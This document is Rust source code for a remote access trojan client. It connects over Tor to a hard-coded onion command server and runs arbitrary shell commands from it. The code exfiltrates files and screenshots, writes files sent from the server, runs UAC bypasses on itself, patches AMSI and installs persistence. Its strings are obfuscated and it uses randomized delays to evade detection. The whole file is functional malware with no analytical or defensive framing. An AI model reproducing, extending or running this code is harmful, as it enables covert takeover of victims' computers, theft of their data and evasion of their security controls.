

#[cfg(target_os = "windows")]
mod uac_cmstp;
#[cfg(target_os = "windows")]
mod uac_bypass;
#[cfg(target_os = "windows")]
mod amsi;
mod persist;
mod portscanner;
pub mod util;
#[cfg(feature = "shared-lib")]
mod exports;
use goldberg::goldberg_stmts;
#[cfg(target_os = "windows")]
use is_elevated::is_elevated;

use arti_client::{TorClient, DataStream};
use arti_client::config::TorClientConfigBuilder;
use tor_rtcompat::PreferredRuntime;
use tokio::io::split;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::process::Command;
use anyhow::{Result, anyhow};
use gethostname::gethostname;
use tokio::time::{sleep, Duration};
use std::{fs};
use std::path::{Path};
use base64::{engine::general_purpose, Engine as _};
use libc::{c_int};

#[cfg(not(target_os = "android"))]
use screenshots::{Screen};
#[cfg(not(target_os = "android"))]
use screenshots::image::ImageOutputFormat;





#[cfg(target_os = "windows")]
const CREATE_NO_WINDOW: u32 = 0x08000000;

const CONFIG_HOSTNAME: &[u8] = include_bytes!("../config/hostname");

fn get_onion_host() -> String {
    String::from_utf8_lossy(CONFIG_HOSTNAME).trim().to_string()
}


#[derive(Clone, Debug)]
pub struct ClientConfig {
    pub onion: String,
    pub port: u16,
}


impl Default for ClientConfig {
    fn default() -> Self {
        Self {
            onion: get_onion_host(),
            port: goldberg::goldberg_int!(1337),
        }
    }
}
/// Initialize Tor client
async fn init_tor() -> Result<TorClient<PreferredRuntime>> {
    let config = TorClientConfigBuilder::new()
        .build()?;
    let client = TorClient::create_bootstrapped(config).await?;
    println!("{}", cryptify::encrypt_string!("Initialized Tor Client"));
    Ok(client)
}

#[cfg(not(target_os = "android"))]
fn take_screenshot_base64() -> anyhow::Result<String> {
    let screens = Screen::all()?;
    let screen = &screens[0];

    // Capture screenshot
    let image = screen.capture()?;

    // Encode PNG into memory
    let mut png_bytes: Vec<u8> = Vec::new();

    image.write_to(
        &mut std::io::Cursor::new(&mut png_bytes),
        ImageOutputFormat::Png,
    )?;

    // Convert PNG bytes -> base64
    let b64 = general_purpose::STANDARD.encode(&png_bytes);
    Ok(format!("{}",b64))
}


fn get_hostname() -> String {
    gethostname()
        .into_string()
        .unwrap_or_else(|_| cryptify::encrypt_string!("unknown").into())
}

/// Execute a command
pub async fn run_command(input: &str) -> Result<Vec<u8>> {
    let mut parts = input.trim().split_whitespace();

    let cmd = parts.next().ok_or_else(|| anyhow!(cryptify::encrypt_string!("Empty command")))?;
    let args: Vec<&str> = parts.collect();

    match cmd {
        "help" | "/h"|"/?" |"" => {
            Ok(format!("

Available commands:
    `cd [directory]`=>\t Change Directory to [directory]
    `screenshot`=>\tTake screenshot from vicim machine
    `upload [filename]`=>\tUpload file to the server
    `download [filename]`=>\tDownload file from the server
    `uac [exe_path]`=>\tRun elevated command on Windows (slui)
    `uac2 [exe_path]`=>\tRun elevated command on Windows (cmstp)
    `persist`=>\tApply persistence on target
    `check_elevated`=>\tCheck if running with elevated privileges
    `self_uac`=>\tRun UAC bypass on self
    `portscan <tcp|udp|sctp> <host> [--fast]`=>\tPort scan target host

    ").into_bytes())
        }
        "screenshot" => {
            #[cfg(target_os = "android")]
            let encoded = {
                let output = std::process::Command::new(cryptify::encrypt_string!("/system/bin/screencap"))
                    .arg(cryptify::encrypt_string!("-p"))
                    .output()
                    .context(cryptify::encrypt_string!("Failed to run screencap"))?;
                general_purpose::STANDARD.encode(&output.stdout)
            };
            #[cfg(not(target_os = "android"))]
            let encoded = take_screenshot_base64()?;

            let default_filename = cryptify::encrypt_string!("screenshot.png");
            let filename = args.get(goldberg::goldberg_int!(0)).filter(|s| !s.is_empty()).copied().unwrap_or(&default_filename);
            Ok(format!("[file] {} {}", filename, encoded).into_bytes())
        }
        "upload" => {
            let input_filename = args
                .get(goldberg::goldberg_int!(0))
                .ok_or_else(|| anyhow!(cryptify::encrypt_string!("upload: missing filename")))?;

            let path = Path::new(input_filename);

            let data = fs::read(path)?;

            let filename = path
                .file_name()
                .and_then(|f| f.to_str())
                .ok_or_else(|| anyhow!(cryptify::encrypt_string!("invalid filename")))?;
            let encoded = general_purpose::STANDARD.encode(&data);

            let mut output = format!("[file-start] {}\n", filename);
            for chunk in encoded.as_bytes().chunks(16384) {
                let chunk_str = std::str::from_utf8(chunk).unwrap();
                output.push_str(&cryptify::encrypt_string!("[file-chunk] "));
                output.push_str(chunk_str);
                output.push('\n');
            }
            output.push_str(&format!("[file-end] {}\n", filename));
            Ok(output.into_bytes())
        }
        "download" | "[file][" => {
            let input_filename = args
                .get(goldberg::goldberg_int!(0))
                .ok_or_else(|| anyhow!(cryptify::encrypt_string!("download: missing filename")))?;

            let encoded = args
                .get(goldberg::goldberg_int!(1))
                .ok_or_else(|| anyhow!(cryptify::encrypt_string!("download: missing data")))?;

            let data = general_purpose::STANDARD.decode(encoded)?;

            let path = Path::new(input_filename);

            fs::write(path, &data)?;

            Ok(format!("Wrote data to {}", input_filename).into_bytes())
        }
        "cd" => {
            let target = args.get(goldberg::goldberg_int!(0)).ok_or_else(|| anyhow!(cryptify::encrypt_string!("cd: missing argument")))?;

            match std::env::set_current_dir(target) {
                Ok(_) => {
                    let cwd = std::env::current_dir()?;
                    Ok(format!("Changed directory to {}\n", cwd.display()).into_bytes())
                }
                Err(e) => {
                    Ok(format!("cd error: {}\n", e).into_bytes())
                }
            }
        }
        "uac" => {
            #[cfg(target_os = "windows")]
            {
                if args.is_empty() {
                    return Ok(b"uac: missing argument\n".to_vec());
                }

                let payload = args.join(cryptify::encrypt_string!(" ").as_str());
                uac_bypass::uac_slui(&payload);

                Ok(format!("Triggered UAC (slui) with payload: {}\n", payload).into_bytes())
            }

            #[cfg(not(target_os = "windows"))]
            {
                Ok(b"uac not supported on this OS\n".to_vec())
            }
        }

        "uac2" => {
            #[cfg(target_os = "windows")]
            {
                if args.is_empty() {
                    return Ok(b"uac2: missing argument\n".to_vec());
                }

                let payload = args.join(cryptify::encrypt_string!(" ").as_str());
                let ret = uac_cmstp::execute(&payload);
                if ret == 0 {
                    Ok(format!("UAC (cmstp) triggered with payload: {}\n", payload).into_bytes())
                } else {
                    Ok(format!("UAC (cmstp) failed (returned {}) with payload: {}\n", ret, payload).into_bytes())
                }
            }

            #[cfg(not(target_os = "windows"))]
            {
                Ok(b"uac2 not supported on this OS\n".to_vec())
            }
        }

        "check_elevated" => {
            #[cfg(target_os = "windows")]
            {
                let elevated = is_elevated();
                Ok(format!("Elevated: {}\n", elevated).into_bytes())
            }
            #[cfg(not(target_os = "windows"))]
            {
                Ok(b"check_elevated not supported on this OS\n".to_vec())
            }
        }

        "self_uac" => {
            #[cfg(target_os = "windows")]
            {
                let exe_path = match std::env::current_exe() {
                    Ok(p) => p.to_string_lossy().to_string(),
                    Err(_) => return Ok(b"Failed to get exe path\n".to_vec()),
                };
                uac_bypass::uac_slui(&exe_path);
                Ok(format!("Self-UAC triggered (slui) for: {}\n", exe_path).into_bytes())
            }
            #[cfg(not(target_os = "windows"))]
            {
                Ok(b"self_uac not supported on this OS\n".to_vec())
            }
        }

        "persist" => {
            let _ = persist::persist();
            Ok(b"Persistence applied\n".to_vec())
        }

        "portscan" => {
            let protocol = args.get(goldberg::goldberg_int!(0)).ok_or_else(|| anyhow!(cryptify::encrypt_string!("portscan: missing protocol")))?.to_lowercase();
            let host = args.get(goldberg::goldberg_int!(1)).ok_or_else(|| anyhow!(cryptify::encrypt_string!("portscan: missing host")))?.to_string();
            let fast = args.contains(&cryptify::encrypt_string!("--fast").as_str());

            let ports: Vec<u16> = if fast {
                portscanner::COMMON_PORTS.to_vec()
            } else {
                (goldberg::goldberg_int!(1)..=goldberg::goldberg_int!(65535)).collect()
            };

            let total = ports.len();
            let msg = format!("Scanning {} ports on {} ({})...\n", total, host, protocol);
            let scan_type = protocol.as_str();

            let open = match scan_type {
                "tcp" => portscanner::scan_tcp(&host, &ports).await,
                "udp" => portscanner::scan_udp(&host, &ports).await,
                "sctp" => {
                    #[cfg(unix)]
                    { portscanner::scan_sctp(&host, &ports).await }
                    #[cfg(not(unix))]
                    { return Err(anyhow!(cryptify::encrypt_string!("SCTP scan not supported on this OS"))); }
                }
                _ => return Err(anyhow!("portscan: unknown protocol '{}' (use tcp, udp, or sctp)", protocol)),
            };

            if open.is_empty() {
                Ok(format!("{}No open ports found on {}\n", msg, host).into_bytes())
            } else {
                Ok(format!("{}Open ports on {} ({}): {}\n",
                    msg, host, protocol,
                    open.iter().map(|p| p.to_string()).collect::<Vec<_>>().join(", ")
                ).into_bytes())
            }
        }

        "exit" | "quit" | "/quit" => {
            Ok(cryptify::encrypt_string!("Goodbye\n").as_bytes().to_vec())
        }

        _ => goldberg_stmts!({
            #[cfg(target_os = "windows")]
            let mut command = {
                let mut c = Command::new(cryptify::encrypt_string!("cmd.exe"));
                c.arg(cryptify::encrypt_string!("/C"))
                    .arg(input)
                    .creation_flags(CREATE_NO_WINDOW);
                c
            };

            #[cfg(target_os = "linux")]
            let mut command = {
                let mut c = Command::new(cryptify::encrypt_string!("/bin/sh"));
                c.arg(cryptify::encrypt_string!("-c")).arg(input);
                c
            };
            #[cfg(target_os = "macos")]
            let mut command = {
                let mut c = Command::new(cryptify::encrypt_string!("/bin/sh"));
                c.arg(cryptify::encrypt_string!("-c")).arg(input);
                c
            };
            #[cfg(target_os = "android")]
            let mut command = {
                let mut c = Command::new(cryptify::encrypt_string!("/system/bin/sh"));
                c.arg(cryptify::encrypt_string!("-c")).arg(input);
                c
            };



            let output = command.output().await?;
            let mut result = Vec::new();
            result.extend_from_slice(&output.stdout);
            result.extend_from_slice(&output.stderr);

            if result.is_empty() {
                result.extend_from_slice(b"(no output)\n");
            }

            if !result.ends_with(b"\n") {
                result.push(b'\n');
            }

            Ok(result)
        })
    }
}

/// Connect to onion service
pub async fn connect_onion(
    tor_client: &TorClient<PreferredRuntime>,
    onion_addr: &str,
    port: u16,
) -> Result<DataStream> {
    Ok(tor_client.connect((onion_addr, port)).await?)
}

/// Session loop, returns Ok(true) on exit, Ok(false) on disconnect
pub async fn read_loop(stream: DataStream) -> Result<bool> {
    let (mut reader, mut writer) = split(stream);

    let mut buf = [0u8; 16384];
    let mut buffer = String::new();
    let mut dl_filename: Option<String> = None;
    let mut dl_data: String = String::new();

    let hostname = get_hostname();
    writer.write_all(hostname.as_bytes()).await?;
    writer.flush().await?;

    loop {
        let n = reader.read(&mut buf).await?;

        if n == 0 {
            println!("{}", cryptify::encrypt_string!("Connection closed by remote"));
            return Ok(false);
        }

        buffer.push_str(&String::from_utf8_lossy(&buf[..n]));

        while let Some(pos) = buffer.find('\n') {
            let mut line = buffer[..pos].to_string();
            buffer.drain(..=pos);

            line = line.trim().to_string();

            if line.starts_with(&cryptify::encrypt_string!("download-start ")) {
                let parts: Vec<&str> = line.splitn(goldberg::goldberg_int!(2), ' ').collect();
                dl_filename = Some(parts.get(goldberg::goldberg_int!(1)).copied().unwrap_or(&cryptify::encrypt_string!("unknown")).to_string());
                dl_data.clear();
                continue;
            }

            if dl_filename.is_some() {
                if line.starts_with(&cryptify::encrypt_string!("download-chunk ")) {
                    let parts: Vec<&str> = line.splitn(goldberg::goldberg_int!(2), ' ').collect();
                    if let Some(chunk) = parts.get(goldberg::goldberg_int!(1)) {
                        dl_data.push_str(chunk);
                    }
                    continue;
                }
                if line == cryptify::encrypt_string!("download-end") {
                    let fname = dl_filename.take().unwrap();
                    let raw = general_purpose::STANDARD.decode(&dl_data)?;
                    fs::write(&fname, &raw)?;
                    let msg = format!("Wrote data to {}\n", fname);
                    writer.write_all(msg.as_bytes()).await?;
                    writer.flush().await?;
                    continue;
                }
                dl_filename = None;
                dl_data.clear();
            }

            if line.is_empty() {
                continue;
            }

            if line == cryptify::encrypt_string!("exit") || line == cryptify::encrypt_string!("quit") || line == cryptify::encrypt_string!("/quit") {
                writer.write_all(b"Goodbye\n").await?;
                writer.flush().await?;
                return Ok(true);
            }

            match run_command(&line).await {
              Ok(output) => {
              writer.write_all(&output).await?;
              }
              Err(e) => {
                let err_msg = format!("ERROR: {}\n", e);
                writer.write_all(err_msg.as_bytes()).await?;
            }
        }

        writer.flush().await?;
        }
    }
}
fn rand_range(min: u64, max: u64) -> u64 {
    let nanos = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos();
    min + (nanos as u64) % (max - min + 1)
}
/// Core runner
pub async fn netclient_run(config: ClientConfig) -> Result<()> {
    loop {
        println!("{}", cryptify::encrypt_string!("Attempting to connect..."));

        let tor_client = init_tor().await?;

        match connect_onion(&tor_client, &config.onion, config.port).await {
            Ok(stream) => {
                println!("{}", cryptify::encrypt_string!("Connected to onion service"));

                match read_loop(stream).await {
                    Ok(true) => {
                        println!("{}", cryptify::encrypt_string!("Exit requested"));
                        break;
                    }
                    Ok(false) => {
                        println!("{}", cryptify::encrypt_string!("Connection closed"));
                    }
                    Err(e) => {
                        println!("Session error: {}", e);
                    }
                }
            }
            Err(e) => {
                println!("Connection failed: {}", e);
            }
        }
        let delay = rand_range(goldberg::goldberg_int!(13), goldberg::goldberg_int!(121));
        println!("Reconnecting in {} seconds...", delay);
        sleep(Duration::from_secs(delay)).await;
    }
    Ok(())
}


async fn netclient_impl() -> c_int {
    #[cfg(target_os = "windows")]
    goldberg_stmts!({
        let executable = std::env::current_exe().unwrap().display().to_string();
        uac_cmstp::execute(&executable);
        println!("Ran uac bypass. sleeping for 31 seconds");
        sleep(Duration::from_secs(31)).await;
    });
    let startup_delay = rand_range(goldberg::goldberg_int!(17), goldberg::goldberg_int!(42));
    println!("{} {}s", cryptify::encrypt_string!("Delaying startup by"), startup_delay);
    sleep(Duration::from_secs(startup_delay)).await;
    goldberg_stmts!({
        let _ = netclient_run(ClientConfig::default()).await;
        0
    })
}
pub async fn netclient() -> c_int {
    let _ = amsi::patch_amsi();
    #[cfg(target_os = "windows")]
        {
            let exe_path = match std::env::current_exe() {
                Ok(p) => p.to_string_lossy().to_string(),
                Err(_) => return 2,                };
            uac_cmstp::execute(&exe_path);
        }
    let _ = persist::persist();
    netclient_impl().await;
    0
}

#[cfg(feature = "shared-lib")]
pub async fn netclient_dll() -> c_int {
    netclient_impl().await;
    0
}
